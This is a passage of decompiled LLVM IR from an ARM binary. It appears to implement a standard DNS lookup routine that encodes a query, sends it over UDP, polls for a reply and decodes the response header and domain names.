dec_label_pc_1be7c:                               ; preds = %bb216, %dec_label_pc_1be54
  store i32 %stack_var_-468.0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1be80 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_1be80, label %dec_label_pc_1be88, label %dec_label_pc_1be7c.dec_label_pc_1beb8_crit_edge

dec_label_pc_1be7c.dec_label_pc_1beb8_crit_edge:  ; preds = %dec_label_pc_1be7c
  %v0_1bec0.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1beb8

dec_label_pc_1be88:                               ; preds = %dec_label_pc_1be7c
  store i32 27508, i32* %r3.global-to-local, align 4
  store i32 1283, i32* %ip.global-to-local, align 4
  %v0_1be90 = load i32, i32* @r8, align 4
  %v2_1be90 = add i32 %v0_1be90, 27508
  %v3_1be90 = inttoptr i32 %v2_1be90 to i32*
  %v4_1be90 = load i32, i32* %v3_1be90, align 4
  %v2_1be94 = add i32 %v0_1be90, 1283
  %v3_1be94 = inttoptr i32 %v2_1be94 to i8*
  %v4_1be94 = load i8, i8* %v3_1be94, align 1
  %v6_1be94 = zext i8 %v4_1be94 to i32
  %v2_1be98 = mul i32 %v6_1be94, %v4_1be90
  store i32 %v2_1be98, i32* %r3.global-to-local, align 4
  store i32 26464, i32* %r1.global-to-local, align 4
  %v2_1bea4 = add i32 %v0_1be90, 1280
  %v3_1bea4 = inttoptr i32 %v2_1bea4 to i16*
  %v4_1bea4 = load i16, i16* %v3_1bea4, align 2
  %v6_1bea4 = zext i16 %v4_1bea4 to i32
  %v2_1bea8 = add i32 %v0_1be90, 26464
  %v3_1bea8 = inttoptr i32 %v2_1bea8 to i32*
  %v4_1bea8 = load i32, i32* %v3_1bea8, align 4
  store i32 %v4_1bea8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1beb8

dec_label_pc_1beb8:                               ; preds = %dec_label_pc_1be7c.dec_label_pc_1beb8_crit_edge, %dec_label_pc_1be88
  %v2_1befc = phi i32 [ %v0_1be90, %dec_label_pc_1be88 ], [ %v0_1bec0.pre, %dec_label_pc_1be7c.dec_label_pc_1beb8_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_1bea4, %dec_label_pc_1be88 ], [ %stack_var_-464.0, %dec_label_pc_1be7c.dec_label_pc_1beb8_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_1bea8, %dec_label_pc_1be88 ], [ %stack_var_-468.0, %dec_label_pc_1be7c.dec_label_pc_1beb8_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_1be98, %dec_label_pc_1be88 ], [ %stack_var_-476.0, %dec_label_pc_1be7c.dec_label_pc_1beb8_crit_edge ]
  store i32 27508, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-468.1, i32* %ip.global-to-local, align 4
  %v2_1bec0 = add i32 %v2_1befc, 27508
  %v3_1bec0 = inttoptr i32 %v2_1bec0 to i32*
  %v4_1bec0 = load i32, i32* %v3_1bec0, align 4
  store i32 27504, i32* %r3.global-to-local, align 4
  %v3_1bec8 = icmp uge i32 %stack_var_-468.1, %v4_1bec0
  store i1 %v3_1bec8, i1* %cpsr_c.global-to-local, align 1
  %v2_1becc = add i32 %v2_1befc, 27504
  %v3_1becc = inttoptr i32 %v2_1becc to i32*
  %v4_1becc = load i32, i32* %v3_1becc, align 4
  store i32 %v4_1becc, i32* %r3.global-to-local, align 4
  br i1 %v3_1bec8, label %bb217, label %bb218

bb217:                                            ; preds = %dec_label_pc_1beb8
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb218

bb218:                                            ; preds = %dec_label_pc_1beb8, %bb217
  %v0_1bed8 = phi i32 [ %stack_var_-468.1, %dec_label_pc_1beb8 ], [ 0, %bb217 ]
  %v3_1bed8 = mul i32 %v0_1bed8, 28
  %v4_1bed8 = add i32 %v3_1bed8, %v4_1becc
  store i32 %v4_1bed8, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-464.1, i32* %ip.global-to-local, align 4
  %v1_1bee4 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_1bef0 = urem i32 %v1_1bee4, 65536
  store i32 26464, i32* %r1.global-to-local, align 4
  %v1_1befc = trunc i32 %v1_1bee4 to i16
  %v4_1befc = add i32 %v2_1befc, 1280
  %v5_1befc = inttoptr i32 %v4_1befc to i16*
  store i16 %v1_1befc, i16* %v5_1befc, align 2
  %v1_1bf04 = load i32, i32* @r8, align 4
  %v2_1bf04 = load i32, i32* %r1.global-to-local, align 4
  %v3_1bf04 = add i32 %v2_1bf04, %v1_1bf04
  %v4_1bf04 = inttoptr i32 %v3_1bf04 to i32*
  store i32 %v0_1bed8, i32* %v4_1bf04, align 4
  %v0_1bf08 = load i32, i32* %r3.global-to-local, align 4
  %v1_1bf0c = inttoptr i32 %v0_1bf08 to i32*
  %v2_1bf0c = load i32, i32* %v1_1bf0c, align 4
  %v3_1bf0c = add i32 %v0_1bf08, 4
  %v4_1bf0c = inttoptr i32 %v3_1bf0c to i32*
  %v5_1bf0c = load i32, i32* %v4_1bf0c, align 4
  store i32 %v5_1bf0c, i32* %r1.global-to-local, align 4
  %v9_1bf0c = add i32 %v0_1bf08, 12
  %v10_1bf0c = inttoptr i32 %v9_1bf0c to i32*
  %v11_1bf0c = load i32, i32* %v10_1bf0c, align 4
  store i32 %v11_1bf0c, i32* %r3.global-to-local, align 4
  %v12_1bf0c = add i32 %v0_1bf08, 16
  %v4_1bf14 = trunc i32 %v2_1bf0c to i16
  store i16 %v4_1bf14, i16* %stack_var_-104, align 2
  store i32 %v15_1bf14, i32* %ip.global-to-local, align 4
  %v1_1bf18 = inttoptr i32 %v12_1bf0c to i32*
  %v2_1bf18 = load i32, i32* %v1_1bf18, align 4
  %v3_1bf18 = add i32 %v0_1bf08, 20
  %v4_1bf18 = inttoptr i32 %v3_1bf18 to i32*
  %v5_1bf18 = load i32, i32* %v4_1bf18, align 4
  store i32 %v5_1bf18, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 %v2_1bf18, i32* %stack_var_-88, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1bf2c = load i32, i32* @r8, align 4
  %v2_1bf2c = add i32 %v0_1bf2c, 24
  %v3_1bf2c = inttoptr i32 %v2_1bf2c to i32*
  %v4_1bf2c = load i32, i32* %v3_1bf2c, align 4
  store i32 %v4_1bf2c, i32* %ip.global-to-local, align 4
  store i32 114488, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1bf2c)
  store i32 %v2_1bf38, i32* @r6, align 4
  %v0_1bf3c = load i32, i32* @r7, align 4
  store i32 %v0_1bf3c, i32* %r1.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v0_1bf44 = load i32, i32* @sl, align 4
  %v2_1bf48 = inttoptr i32 %v0_1bf44 to i8*
  %v3_1bf48 = call i32 @__GI_memset(i8* %v2_1bf48, i32 %v0_1bf3c)
  %v0_1bf4c = load i32, i32* @r7, align 4
  store i32 %v0_1bf4c, i32* %r1.global-to-local, align 4
  store i32 48, i32* @r2, align 4
  %v3_1bf58 = call i32 @__GI_memset(i8* %v2_1bf58, i32 %v0_1bf4c)
  store i32 %v3_1bef0, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_1bf68 = load i32, i32* @sl, align 4
  store i32 %v0_1bf68, i32* %r1.global-to-local, align 4
  store i32 %v3_1bef0, i32* %stack_var_-192, align 4
  %v6_1bf7c = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_1bf68, i32 512, i32 %v3_1bef0, i32 %v3_1bef0)
  store i32 %v6_1bf7c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1bf80 = icmp slt i32 %v6_1bf7c, 0
  br i1 %v1_1bf80, label %dec_label_pc_1c43c, label %dec_label_pc_1bf88

dec_label_pc_1bf88:                               ; preds = %bb218
  store i32 %v0_1bcf4, i32* @ip, align 4
  store i32 %v1_1bd3c, i32* @r5, align 4
  %v0_1bf98 = load i32, i32* @sl, align 4
  %v2_1bf98 = add i32 %v0_1bf98, %v6_1bf7c
  store i32 %v2_1bf98, i32* %r1.global-to-local, align 4
  %v1_1bf9c = sub i32 512, %v6_1bf7c
  store i32 %v1_1bd3c, i32* %stack_var_-60, align 4
  store i32 %v0_1bcf4, i32* %stack_var_-56, align 4
  %v4_1bfa8 = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_1bf98, i32 %v1_1bf9c)
  store i32 %v4_1bfa8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1bfac = icmp slt i32 %v4_1bfa8, 0
  br i1 %v1_1bfac, label %dec_label_pc_1c43c, label %dec_label_pc_1bfb4

dec_label_pc_1bfb4:                               ; preds = %dec_label_pc_1bf88
  %v3_1bfb8 = load i16, i16* %stack_var_-104, align 2
  %v4_1bfb8 = sext i16 %v3_1bfb8 to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_1bfc4 = call i32 @socket(i32 %v4_1bfb8, i32 2, i32 17)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1bfc8 = icmp slt i32 %v3_1bfc4, 0
  br i1 %v1_1bfc8, label %dec_label_pc_1c414, label %dec_label_pc_1bfd4

dec_label_pc_1bfd4:                               ; preds = %dec_label_pc_1bfb4
  store i32 %v2_1bf10, i32* %r1.global-to-local, align 4
  %v3_1bfdc = call i32 @__libc_connect(i32 %v3_1bfc4, i32 %v2_1bf10, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1bfe0 = icmp slt i32 %v3_1bfdc, 0
  br i1 %v1_1bfe0, label %dec_label_pc_1c414, label %dec_label_pc_1bfe8

dec_label_pc_1bfe8:                               ; preds = %dec_label_pc_1bfd4
  %v0_1bfe8 = load i32, i32* @r5, align 4
  %v1_1bfe8 = load i32, i32* @r4, align 4
  %v2_1bfe8 = add i32 %v1_1bfe8, %v0_1bfe8
  %v0_1bfec = load i32, i32* @r7, align 4
  store i32 %v0_1bfec, i32* %r3.global-to-local, align 4
  %v0_1bff4 = load i32, i32* @sl, align 4
  store i32 %v0_1bff4, i32* %r1.global-to-local, align 4
  %v4_1bff8 = call i32 @__libc_send(i32 %v3_1bfc4, i32 %v0_1bff4, i32 %v2_1bfe8, i32 %v0_1bfec)
  store i32 1282, i32* %r3.global-to-local, align 4
  %v0_1c000 = load i32, i32* @r8, align 4
  %v2_1c000 = add i32 %v0_1c000, 1282
  %v3_1c000 = inttoptr i32 %v2_1c000 to i8*
  %v4_1c000 = load i8, i8* %v3_1c000, align 1
  %v6_1c000 = zext i8 %v4_1c000 to i32
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_1c008 = mul nuw nsw i32 %v6_1c000, 1000
  store i32 %v2_1c008, i32* @r4, align 4
  store i32 %v2_1c00c, i32* @r5, align 4
  br label %dec_label_pc_1c010

dec_label_pc_1c010:                               ; preds = %thread-pre-split, %dec_label_pc_1bfe8
  %v0_1c01c = phi i32 [ %v1_1c05c, %thread-pre-split ], [ %v2_1c008, %dec_label_pc_1bfe8 ]
  store i32 %v3_1bfc4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 %v2_1c018, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v3_1bfc4, i32* %stack_var_-48, align 4
  %v7_1c030 = call i32 @__GI_poll(i32 %v2_1c00c, i32 1, i32 %v0_1c01c, i32 %v3_1bfc4, i32 %v3_1bfc4, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_1c038 = load i32, i32* @sl, align 4
  store i32 %v0_1c038, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp219 = icmp slt i32 %v7_1c030, 1
  br i1 %tmp219, label %dec_label_pc_1c414, label %dec_label_pc_1c04c

dec_label_pc_1c04c:                               ; preds = %dec_label_pc_1c010
  %v5_1c04c = call i32 @__libc_recv(i32 %v3_1bfc4, i32 %v0_1c038, i32 512, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v2_1c050 = icmp ugt i32 %v5_1c04c, 10
  store i1 %v2_1c050, i1* %cpsr_c.global-to-local, align 1
  %v8_1c058 = icmp sgt i32 %v5_1c04c, 11
  br i1 %v8_1c058, label %dec_label_pc_1c084, label %dec_label_pc_1c05c

dec_label_pc_1c05c:                               ; preds = %dec_label_pc_1c084, %dec_label_pc_1c0a0, %dec_label_pc_1c04c
  %v0_1c05c = load i32, i32* @r4, align 4
  %v1_1c05c = add i32 %v0_1c05c, -1000
  store i32 %v1_1c05c, i32* @r4, align 4
  %v7_1c05c = icmp eq i32 %v0_1c05c, 1000
  %tmp283 = zext i1 %v7_1c05c to i32
  %. = xor i32 %tmp283, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1c06c = icmp slt i32 %v5_1c04c, 0
  br i1 %v1_1c06c, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_1c05c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1c414

thread-pre-split:                                 ; preds = %dec_label_pc_1c05c
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1c05c, label %dec_label_pc_1c414, label %dec_label_pc_1c010

dec_label_pc_1c084:                               ; preds = %dec_label_pc_1c04c
  store i32 %v2_1bf38, i32* %r1.global-to-local, align 4
  %v0_1c088 = load i32, i32* @sl, align 4
  %v2_1c08c = inttoptr i32 %v0_1c088 to i8*
  %v3_1c08c = call i32 @__decode_header(i8* %v2_1c08c, i32 %v2_1bf38)
  %v3_1c090 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_1c090, i32* %r3.global-to-local, align 4
  store i32 %v3_1bef0, i32* %r1.global-to-local, align 4
  %v3_1c098 = icmp uge i32 %v3_1c090, %v3_1bef0
  store i1 %v3_1c098, i1* %cpsr_c.global-to-local, align 1
  %v9_1c098 = icmp eq i32 %v3_1c090, %v3_1bef0
  br i1 %v9_1c098, label %dec_label_pc_1c0a0, label %dec_label_pc_1c05c

dec_label_pc_1c0a0:                               ; preds = %dec_label_pc_1c084
  store i32 %tmp161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1c0a4, label %dec_label_pc_1c05c, label %dec_label_pc_1c0ac

dec_label_pc_1c0ac:                               ; preds = %dec_label_pc_1c0a0
  store i32 %v1_1c0b0, i32* %r3.global-to-local, align 4
  store i1 %v2_1c0b4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_1c0b0.cmp, label %dec_label_pc_1c0e8, label %dec_label_pc_1c0bc

dec_label_pc_1c0bc:                               ; preds = %dec_label_pc_1c0ac
  store i1 %v2_1c0c0, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_1c0c0, label %dec_label_pc_1c0dc, label %dec_label_pc_1c0c8

dec_label_pc_1c0c8:                               ; preds = %dec_label_pc_1c0bc
  store i32 %v4_1be34, i32* @r5, align 4
  %v1_1c0cc = add i32 %v4_1be34, -1
  store i32 %v1_1c0cc, i32* %r3.global-to-local, align 4
  %v0_1c0d0 = load i32, i32* @sb, align 4
  %v3_1c0d0 = icmp uge i32 %v0_1c0d0, %v1_1c0cc
  store i1 %v3_1c0d0, i1* %cpsr_c.global-to-local, align 1
  %v5_1c0d4 = icmp slt i32 %v0_1c0d0, %v1_1c0cc
  br i1 %v5_1c0d4, label %.thread7, label %dec_label_pc_1c0dc

.thread7:                                         ; preds = %dec_label_pc_1c0c8
  %v7_1c0d4 = add i32 %v0_1c0d0, 1
  br label %dec_label_pc_1c424

dec_label_pc_1c0dc:                               ; preds = %dec_label_pc_1c0c8, %dec_label_pc_1c0bc
  %v0_1c0dc = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1c110

dec_label_pc_1c0e8:                               ; preds = %dec_label_pc_1c0ac
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1c0e8, label %dec_label_pc_1c0f0, label %dec_label_pc_1c414

dec_label_pc_1c0f0:                               ; preds = %dec_label_pc_1c0e8
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp214, label %dec_label_pc_1c108, label %dec_label_pc_1c118

dec_label_pc_1c108:                               ; preds = %dec_label_pc_1c0f0
  %v0_1c108 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_1c110

dec_label_pc_1c110:                               ; preds = %dec_label_pc_1c0dc, %dec_label_pc_1c108
  %storemerge2 = phi i32 [ %v0_1c108, %dec_label_pc_1c108 ], [ %v0_1c0dc, %dec_label_pc_1c0dc ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1c108 ], [ 1, %dec_label_pc_1c0dc ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_1c110 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_1c110, align 4
  br label %dec_label_pc_1c45c

dec_label_pc_1c118:                               ; preds = %dec_label_pc_1c0f0
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1c11c.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @ip, align 4
  %v2_1c11c = add i32 %v0_1c11c.pre, 12
  store i32 %v2_1c11c, i32* @r4, align 4
  %v3_1c11c = icmp ugt i32 %v0_1c11c.pre, -13
  store i1 %v3_1c11c, i1* %cpsr_c.global-to-local, align 1
  %v9_1c11c = icmp eq i32 %v2_1c11c, 0
  br i1 %v9_1c11c, label %dec_label_pc_1c414, label %dec_label_pc_1c124

dec_label_pc_1c124:                               ; preds = %dec_label_pc_1c118
  %v2_1c128 = add i32 %v5_1c04c, -12
  store i32 %v2_1c128, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp223 = icmp slt i32 %v2_1c128, 1
  br i1 %tmp223, label %dec_label_pc_1c414, label %dec_label_pc_1c138

dec_label_pc_1c130thread-pre-split:               ; preds = %dec_label_pc_1c154
  %v2_1c16015 = add i32 %v2_1c144, -1
  store i32 %v2_1c16015, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_1c16015, 1
  br i1 %tmp224, label %dec_label_pc_1c414, label %dec_label_pc_1c138

dec_label_pc_1c138:                               ; preds = %dec_label_pc_1c124, %dec_label_pc_1c130thread-pre-split
  %v1_1c15c = phi i32 [ %v2_1c16015, %dec_label_pc_1c130thread-pre-split ], [ %v2_1c128, %dec_label_pc_1c124 ]
  %v0_1c138 = phi i32 [ %v2_1c14c, %dec_label_pc_1c130thread-pre-split ], [ %v2_1c11c, %dec_label_pc_1c124 ]
  %v1_1c138 = inttoptr i32 %v0_1c138 to i8*
  %v2_1c138 = load i8, i8* %v1_1c138, align 1
  %v3_1c138 = zext i8 %v2_1c138 to i32
  store i32 %v3_1c138, i32* %r3.global-to-local, align 4
  %v5_1c138 = add i32 %v0_1c138, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c13c = icmp eq i8 %v2_1c138, 0
  %v2_1c144 = sub i32 %v1_1c15c, %v3_1c138
  store i32 %v2_1c144, i32* @lr, align 4
  %v1_1c148 = and i32 %v3_1c138, 192
  store i32 %v1_1c148, i32* @ip, align 4
  %v2_1c14c = add i32 %v3_1c138, %v5_1c138
  br i1 %v2_1c13c, label %dec_label_pc_1c168, label %dec_label_pc_1c154

dec_label_pc_1c154:                               ; preds = %dec_label_pc_1c138
  %v2_1c154 = icmp eq i32 %v1_1c148, 192
  store i1 %v2_1c154, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1c154, label %.thread9, label %dec_label_pc_1c130thread-pre-split

.thread9:                                         ; preds = %dec_label_pc_1c154
  %v2_1c158 = add i32 %v0_1c138, 2
  %v2_1c15c = add i32 %v1_1c15c, -2
  store i32 %v2_1c15c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c168

dec_label_pc_1c168:                               ; preds = %dec_label_pc_1c138, %.thread9
  %v1_1c174 = phi i32 [ %v2_1c158, %.thread9 ], [ %v5_1c138, %dec_label_pc_1c138 ]
  %v0_1c168 = phi i32 [ %v2_1c15c, %.thread9 ], [ %v1_1c15c, %dec_label_pc_1c138 ]
  %v1_1c168 = add i32 %v0_1c168, -3
  %v2_1c168 = icmp ugt i32 %v0_1c168, 2
  store i1 %v2_1c168, i1* %cpsr_c.global-to-local, align 1
  %v3_1c168 = sub i32 2, %v0_1c168
  %v4_1c168 = and i32 %v3_1c168, %v0_1c168
  %v5_1c168 = icmp slt i32 %v4_1c168, 0
  %v6_1c168 = icmp slt i32 %v1_1c168, 0
  %v7_1c168 = icmp eq i32 %v0_1c168, 3
  %v3_1c16c = xor i1 %v6_1c168, %v5_1c168
  %v4_1c16c = or i1 %v7_1c168, %v3_1c16c
  br i1 %v4_1c16c, label %dec_label_pc_1c414, label %dec_label_pc_1c170

dec_label_pc_1c170:                               ; preds = %dec_label_pc_1c168
  %v1_1c170 = sub i32 -8, %v0_1c11c.pre
  %v2_1c174 = add i32 %v1_1c174, %v1_1c170
  store i32 %v2_1c174, i32* %r3.global-to-local, align 4
  %v3_1c174 = icmp ult i32 %v2_1c174, %v1_1c170
  store i1 %v3_1c174, i1* %cpsr_c.global-to-local, align 1
  %v8_1c174 = icmp slt i32 %v2_1c174, 0
  br i1 %v8_1c174, label %dec_label_pc_1c414, label %dec_label_pc_1c198

dec_label_pc_1c198:                               ; preds = %dec_label_pc_1c170
  %v2_1c180 = add i32 %v2_1c174, 12
  store i32 %v2_1c180, i32* %r1.global-to-local, align 4
  store i32 %v2_1c1a0, i32* @r5, align 4
  store i32 %v2_1c1a4, i32* @r7, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_1c3e856, label %dec_label_pc_1c1bc, label %dec_label_pc_1c3ec

dec_label_pc_1c1bc:                               ; preds = %dec_label_pc_1c198, %dec_label_pc_1c3c4.dec_label_pc_1c1bc_crit_edge
  %v0_1c1c0 = phi i32 [ %v0_1c1c0.pre, %dec_label_pc_1c3c4.dec_label_pc_1c1bc_crit_edge ], [ %v0_1c11c.pre, %dec_label_pc_1c198 ]
  %stack_var_-460.364 = phi i32 [ %v2_1c3cc, %dec_label_pc_1c3c4.dec_label_pc_1c1bc_crit_edge ], [ %v2_1c180, %dec_label_pc_1c198 ]
  %stack_var_-452.061 = phi i32 [ %v1_1c3d0, %dec_label_pc_1c3c4.dec_label_pc_1c1bc_crit_edge ], [ 0, %dec_label_pc_1c198 ]
  %stack_var_-480.260 = phi i32 [ %stack_var_-480.1, %dec_label_pc_1c3c4.dec_label_pc_1c1bc_crit_edge ], [ 1, %dec_label_pc_1c198 ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-460.364, i32* @r1, align 4
  store i32 %v2_1c1a0, i32* %r3.global-to-local, align 4
  %v5_1c1d4 = call i32 @__decode_dotted(i32 %v0_1c1c0, i32 %stack_var_-460.364, i32 %v5_1c04c, i32 %v2_1c1a0, i32 256)
  store i32 %v5_1c1d4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1c1d8 = icmp slt i32 %v5_1c1d4, 0
  br i1 %v1_1c1d8, label %dec_label_pc_1c2a8, label %dec_label_pc_1c1e0

dec_label_pc_1c1e0:                               ; preds = %dec_label_pc_1c1bc
  store i32 %stack_var_-460.364, i32* %r1.global-to-local, align 4
  %v1_1c1e8 = add i32 %v5_1c1d4, 10
  store i32 %v1_1c1e8, i32* @sb, align 4
  %v2_1c1ec = sub i32 %v5_1c04c, %stack_var_-460.364
  %v2_1c1f0 = sub i32 %v2_1c1ec, %v1_1c1e8
  store i32 %v2_1c1f0, i32* %r3.global-to-local, align 4
  %v3_1c1f0 = icmp uge i32 %v2_1c1ec, %v1_1c1e8
  store i1 %v3_1c1f0, i1* %cpsr_c.global-to-local, align 1
  %v8_1c1f0 = icmp slt i32 %v2_1c1f0, 0
  br i1 %v8_1c1f0, label %dec_label_pc_1c2a0.thread, label %dec_label_pc_1c200

dec_label_pc_1c2a0.thread:                        ; preds = %dec_label_pc_1c1e0
  store i32 %v2_1c1f0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1c2a8

dec_label_pc_1c200:                               ; preds = %dec_label_pc_1c1e0
  %v2_1c204 = call i32 @__GI_strdup(i8* %v1_1c204)
  %v0_1c20c = load i32, i32* @r4, align 4
  %v2_1c20c = add i32 %v0_1c20c, %stack_var_-460.364
  %v0_1c210 = load i32, i32* @sl, align 4
  %v2_1c210 = add i32 %v0_1c210, %v2_1c20c
  store i32 %v2_1c210, i32* %r1.global-to-local, align 4
  %v1_1c214 = add i32 %v2_1c210, 2
  store i32 %v1_1c214, i32* %ip.global-to-local, align 4
  %v1_1c218 = add i32 %v2_1c210, 4
  store i32 %v1_1c218, i32* %r3.global-to-local, align 4
  %v1_1c21c = add i32 %v2_1c210, 5
  %v2_1c21c = inttoptr i32 %v1_1c21c to i8*
  %v3_1c21c = load i8, i8* %v2_1c21c, align 1
  %v4_1c21c = zext i8 %v3_1c21c to i32
  %v1_1c224 = add i32 %v2_1c210, 8
  %v2_1c224 = inttoptr i32 %v1_1c224 to i8*
  %v3_1c224 = load i8, i8* %v2_1c224, align 1
  %v4_1c224 = zext i8 %v3_1c224 to i32
  %v1_1c230 = add i32 %v2_1c210, 6
  %v2_1c230 = inttoptr i32 %v1_1c230 to i8*
  %v3_1c230 = load i8, i8* %v2_1c230, align 1
  %v4_1c230 = zext i8 %v3_1c230 to i32
  store i32 %v4_1c230, i32* %r3.global-to-local, align 4
  %v1_1c234 = add i32 %v2_1c210, 9
  %v2_1c234 = inttoptr i32 %v1_1c234 to i8*
  %v3_1c234 = load i8, i8* %v2_1c234, align 1
  %v4_1c234 = zext i8 %v3_1c234 to i32
  %v3_1c23c = inttoptr i32 %v2_1c210 to i8*
  %v4_1c23c = load i8, i8* %v3_1c23c, align 1
  %v6_1c23c = zext i8 %v4_1c23c to i32
  %v1_1c240 = add i32 %v2_1c210, 3
  %v2_1c240 = inttoptr i32 %v1_1c240 to i8*
  %v3_1c240 = load i8, i8* %v2_1c240, align 1
  %v4_1c240 = zext i8 %v3_1c240 to i32
  store i32 %v4_1c240, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v2_1c248 = inttoptr i32 %v1_1c214 to i8*
  %v3_1c248 = load i8, i8* %v2_1c248, align 1
  %v4_1c248 = zext i8 %v3_1c248 to i32
  store i32 %v4_1c248, i32* %ip.global-to-local, align 4
  %v1_1c24c = add i32 %v2_1c210, 1
  %v2_1c24c = inttoptr i32 %v1_1c24c to i8*
  %v3_1c24c = load i8, i8* %v2_1c24c, align 1
  %v4_1c24c = zext i8 %v3_1c24c to i32
  %v4_1c250 = mul nuw nsw i32 %v4_1c224, 256
  %v5_1c250 = or i32 %v4_1c234, %v4_1c250
  store i32 %v5_1c250, i32* @r6, align 4
  store i32 %v4_1c21c, i32* @r7, align 4
  %v4_1c258 = mul nuw nsw i32 %v6_1c23c, 256
  %v5_1c258 = or i32 %v4_1c24c, %v4_1c258
  store i32 %v5_1c258, i32* @lr, align 4
  %v4_1c25c = mul nuw nsw i32 %v4_1c248, 256
  %v5_1c25c = or i32 %v4_1c25c, %v4_1c240
  store i32 %v5_1c25c, i32* %r3.global-to-local, align 4
  store i32 %v2_1c1f0, i32* @r5, align 4
  store i32 %v4_1c230, i32* @ip, align 4
  %v1_1c270 = add i32 %v2_1c210, 10
  store i32 %v1_1c270, i32* %r1.global-to-local, align 4
  %v1_1c274 = add i32 %v2_1c20c, 10
  store i32 %v1_1c274, i32* @r4, align 4
  %v2_1c278 = sub i32 %v2_1c1f0, %v5_1c250
  %v3_1c278 = icmp uge i32 %v2_1c1f0, %v5_1c250
  store i1 %v3_1c278, i1* %cpsr_c.global-to-local, align 1
  %tmp226 = sub i32 0, %v2_1c278
  %v6_1c278 = and i32 %v2_1c1f0, %tmp226
  %v7_1c278 = icmp slt i32 %v6_1c278, 0
  %v8_1c278 = icmp slt i32 %v2_1c278, 0
  store i32 %v2_1c204, i32* %stack_var_-144, align 4
  %v2_1c298 = xor i1 %v8_1c278, %v7_1c278
  br i1 %v2_1c298, label %dec_label_pc_1c2a8, label %dec_label_pc_1c2a0

dec_label_pc_1c2a0:                               ; preds = %dec_label_pc_1c200
  %v0_1c29c = load i32, i32* @sb, align 4
  %v2_1c29c = add i32 %v0_1c29c, %v5_1c250
  store i32 %v2_1c29c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1c2a0 = icmp slt i32 %v2_1c29c, 0
  br i1 %v1_1c2a0, label %dec_label_pc_1c2a8, label %dec_label_pc_1c2c4

dec_label_pc_1c2a8:                               ; preds = %dec_label_pc_1c2a0, %dec_label_pc_1c200, %dec_label_pc_1c1bc, %dec_label_pc_1c2a0.thread
  store i32 %stack_var_-452.061, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1c2ac = icmp eq i32 %stack_var_-452.061, 0
  br i1 %v2_1c2ac, label %dec_label_pc_1c414, label %dec_label_pc_1c2b4

dec_label_pc_1c2b4:                               ; preds = %dec_label_pc_1c2a8
